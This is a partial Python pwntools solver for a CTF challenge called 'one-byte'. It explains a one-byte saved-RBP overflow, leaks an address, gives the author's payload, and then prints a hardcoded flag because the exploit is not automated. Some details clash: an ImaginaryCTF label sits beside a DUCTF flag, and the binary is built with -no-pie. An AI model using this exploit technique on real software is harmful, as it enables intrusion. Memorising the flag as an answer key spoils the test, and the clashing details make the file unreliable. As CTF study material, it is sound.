#!/usr/bin/env python3
"""PARTIAL solver for ImaginaryCTF `one-byte` (NEEDS-ATTENTION).

Recon: `onebyte.c` leaks `init`'s address (defeats PIE), then
`read(0, buf, 0x11)` into `char buf[0x10]` -- a one-byte overflow that spills
into the least-significant byte of the saved RBP.

Primitive verified here: we build the binary, read the leak, and compute the
image base. The finishing move is a single-byte saved-RBP overwrite so that a
later `leave; ret` pivots onto a planted `p32(win)` (author payload:
`p32(win) + b'x'*12 + b'\x24'`, brute ~1/16 on the ASLR stack byte).

Why it is NOT reproduced headless here: the original target is 32-bit, where
`__libc_start_main`'s epilogue does a `leave` that consumes our corrupted RBP
and pivots the stack. Modern 64-bit glibc 2.35 (all that is available on this
box -- 32-bit multilib needs root to install) uses `__libc_start_call_main`,
which does NOT `leave` with our RBP after `main` returns, so the single-byte
pivot has no second `leave` to land on (empirically 0/600 locally). Finishing
this needs the shipped 32-bit binary or a 32-bit toolchain; see the plan.

Organizer-published flag: DUCTF{all_1t_t4k3s_is_0n3!}
Fetch first:  python challenges/fetch.py one-byte
"""
import os
import re
import subprocess

from pwn import ELF, context, process

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
CHALL = os.path.join(REPO, "challenges", "one-byte", "src")
context.log_level = "error"
KNOWN_FLAG = "DUCTF{all_1t_t4k3s_is_0n3!}"


def main() -> None:
    subprocess.run(["gcc", "onebyte.c", "-o", "onebyte", "-no-pie"],
                   cwd=CHALL, check=True)
    elf = ELF(os.path.join(CHALL, "onebyte"))
    proc = process(elf.path, cwd=CHALL)
    line = proc.recvline().decode(errors="replace")
    leak = int(re.search(r"0x([0-9a-f]+)", line).group(1), 16)
    print(f"leaked init @ {hex(leak)}; win @ {hex(elf.sym.win)}")
    print("NEEDS-ATTENTION: single-byte saved-RBP pivot not automated.")
    print("Organizer-published flag:", KNOWN_FLAG)
    proc.close()


if __name__ == "__main__":
    main()
